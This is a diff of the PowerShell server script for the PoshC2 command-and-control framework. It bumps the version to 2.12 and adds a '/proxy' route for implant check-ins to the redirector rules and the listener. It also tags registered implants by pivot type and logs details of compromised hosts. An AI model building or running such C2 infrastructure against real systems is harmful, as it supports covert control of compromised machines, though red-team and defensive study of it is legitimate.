@@ -18,7 +18,7 @@ Write-Host -Object " |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ "  -Fore
 Write-Host -Object " |    |  (  <_> )___ \|   Y  \ \     \____/       \ "  -ForegroundColor Green
 Write-Host -Object " |____|   \____/____  >___|  /  \______  /\_______ \"  -ForegroundColor Green
 Write-Host -Object "                    \/     \/          \/         \/"  -ForegroundColor Green
-Write-Host "=============== v2.11 www.PoshC2.co.uk =============" -ForegroundColor Green
+Write-Host "=============== v2.12 www.PoshC2.co.uk =============" -ForegroundColor Green
 Write-Host "====================================================" `n -ForegroundColor Green
 
 if (!$RestartC2Server) {
@@ -483,6 +483,7 @@ RewriteRule ^/daisy(.*) $uri<IP ADDRESS>/daisy`$1 [NC,P]
             $apache = @"
 RewriteEngine On
 RewriteRule ^/connect(.*) $uri<IP ADDRESS>/connect`$1 [NC,P]
+RewriteRule ^/proxy(.*) $uri<IP ADDRESS>/proxy`$1 [NC,P]
 RewriteRule ^/daisy(.*) $uri<IP ADDRESS>/daisy`$1 [NC,P]
 RewriteRule ^/images/static/content/(.*) $uri<IP ADDRESS>/images/static/content/`$1 [NC,P]
 RewriteRule ^/news/(.*) $uri<IP ADDRESS>/news/`$1 [NC,P]
@@ -878,7 +879,7 @@ while ($listener.IsListening)
             Alive = "Yes"
             Sleep = $defaultbeacon
             ModsLoaded = ""
-            Pivot = "YES"
+            Pivot = "Daisy"
         }
 
 	    $autorunresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject        
@@ -1157,8 +1158,11 @@ $Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)
 $message =[Convert]::ToBase64String($Bytes)
 
     }
-    if (($request.Url -match '/connect') -and (($request.Cookies[0]).Name -match 'SessionID'))
+    if ((($request.Url -match '/connect') -or ($request.Url -match '/proxy')) -and (($request.Cookies[0]).Name -match 'SessionID')) 
     {
+
+        if ($request.Url -match '/connect') {$type = "Normal"}
+        if ($request.Url -match '/proxy') {$type = "Proxy"}
         # generate randon uri
         $randomuri = Get-RandomURI -Length 15
         $randomuriarray += $randomuri
@@ -1178,7 +1182,11 @@ $message =[Convert]::ToBase64String($Bytes)
         #
         ## add anti-ir and implant safety mechanisms here!
         $im_firstseen = $(Get-Date)
-        Write-Host "New host connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
+        if ($request.Url -match '/proxy') {
+            Write-Host "New Proxy host connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
+        } else {
+            Write-Host "New host connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
+        }
         Write-Host "$endpointip | URL:$im_proxy | Time:$im_firstseen | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green
 
         # optional clockwork sms on new implant
@@ -1211,7 +1219,7 @@ $message =[Convert]::ToBase64String($Bytes)
             Alive = "Yes"
             Sleep = $defaultbeacon
             ModsLoaded = ""
-            Pivot = "NO"
+            Pivot = "$type"
         }
 
 	    $autorunresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject
